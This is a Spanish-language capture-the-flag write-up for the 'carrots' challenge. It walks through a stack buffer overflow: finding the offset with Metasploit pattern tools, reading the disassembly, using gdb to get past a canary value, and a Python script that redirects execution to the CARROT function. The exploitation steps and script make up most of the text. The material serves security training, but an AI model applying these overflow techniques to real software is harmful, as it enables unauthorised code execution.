## **Enunciado**

Points: 300   
Country: Mexico   
Attatchment: https://mega.nz/#!twM1nYCA!qXDWql7ER6gLYj6eaT7iG-12sFdH3ozePk0VDl_xLwk   
Description: We all know that rabbits' favorite food is carrots. Help the rabbits to eat their favorite food today and be careful with the birds...good luck!   

## **Solución**

Se trata del clásico buffer overflow que peta cuando le metes más caracteres de los debidos:

```
./carrots 
 Where is my carrot?
 > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaa
Segmentation fault
```

Vamos a crear un patrón de caracteres para averiguar el offset con metasploit:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```

Lo metemos en gdb y nos da una dirección que se corresponde con una parte del patrón anteior. Esta dirección se la pasamos a metaspoit otra vez y nos da el offset:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 150 -q 0x37654136
[*] Exact match at offset 140
```

Si nos fijamos en la función main vemos que hay una función que recoge nuestros datos por consola, esta función es vulnerable a un buffer overflow, por lo tanto vamos a sobreescribir aquí el EIP

```
08049790 <main>:
 8049790:	55                   	push   ebp
 8049791:	89 e5                	mov    ebp,esp
 8049793:	81 ec a8 00 00 00    	sub    esp,0xa8
 8049799:	c7 45 fc 44 52 49 42 	mov    DWORD PTR [ebp-0x4],0x42495244
 80497a0:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [ebp-0x8],0x0
 80497a7:	e8 64 fa ff ff       	call   8049210 <_Z6bannerv>             <== Pinta el dibujito
 80497ac:	8d 05 4a a0 04 08    	lea    eax,ds:0x804a04a
 80497b2:	89 04 24             	mov    DWORD PTR [esp],eax
 80497b5:	e8 a6 f7 ff ff       	call   8048f60 <printf@plt>             <== Muestra la pregunta por pantalla
 80497ba:	8d 0d a0 c0 04 08    	lea    ecx,ds:0x804c0a0
 80497c0:	8d 95 78 ff ff ff    	lea    edx,[ebp-0x88]
 80497c6:	89 0c 24             	mov    DWORD PTR [esp],ecx
 80497c9:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80497cd:	89 85 74 ff ff ff    	mov    DWORD PTR [ebp-0x8c],eax
 80497d3:	e8 c8 f7 ff ff       	call   8048fa0                          <== Función vulnerable que recoge los datos introducidos
 80497d8:	81 7d f8 00 00 00 00 	cmp    DWORD PTR [ebp-0x8],0x0
 80497df:	89 85 70 ff ff ff    	mov    DWORD PTR [ebp-0x90],eax
 80497e5:	0f 85 14 00 00 00    	jne    80497ff <main+0x6f>
 80497eb:	31 c0                	xor    eax,eax
 80497ed:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 80497f4:	89 85 6c ff ff ff    	mov    DWORD PTR [ebp-0x94],eax
 80497fa:	e8 a1 f8 ff ff       	call   80490a0 <exit@plt>
 80497ff:	31 c0                	xor    eax,eax
 8049801:	8b 4d f8             	mov    ecx,DWORD PTR [ebp-0x8]          
 8049804:	89 0d d0 c1 04 08    	mov    DWORD PTR ds:0x804c1d0,ecx    
 804980a:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]
 804980d:	89 0d d4 c1 04 08    	mov    DWORD PTR ds:0x804c1d4,ecx
 8049813:	8b 4d 04             	mov    ecx,DWORD PTR [ebp+0x4]
 8049816:	89 0d d8 c1 04 08    	mov    DWORD PTR ds:0x804c1d8,ecx
 804981c:	81 c4 a8 00 00 00    	add    esp,0xa8
 8049822:	5d                   	pop    ebp
 8049823:	c3                   	ret                                     <== Sobreescribir aquí el EIP antes de llamar a ret
 8049824:	66 90                	xchg   ax,ax
 8049826:	66 90                	xchg   ax,ax
 8049828:	66 90                	xchg   ax,ax
 804982a:	66 90                	xchg   ax,ax
 804982c:	66 90                	xchg   ax,ax
 804982e:	66 90                	xchg   ax,ax

```

Una vez que sabemos que si escribimos 140 caracteres va a sobreescribir el EIP del stack frame de main, podemos poner la dirección que nos interese para dirigir el programa a donde nos interese ejecutarlo. ¿Donde lo apuntamos para que nos muestre el flag?

```
objdump -x carrots | grep CARR
08049570 g     F .text	0000021a              _Z6CARROTv
```

```
br *0x804981c

set {int}0xbffff334=0x42495244
set {int}0xbffff338=0x00000000
set {int}0xbffff33c=0x08049570
evitar canary
```

```python
#!/usr/bin/python
# Fichero pwn_please_no.py 
# Exploit ROP


from struct import pack

binary = "please-no"
junk = "A" * 132

rop = pack('<I', 0x42495244)   
rop += pack('<I', 0x00000000)    
rop += pack('<I', 0x08049570)   


payload = junk + rop 
print payload
```
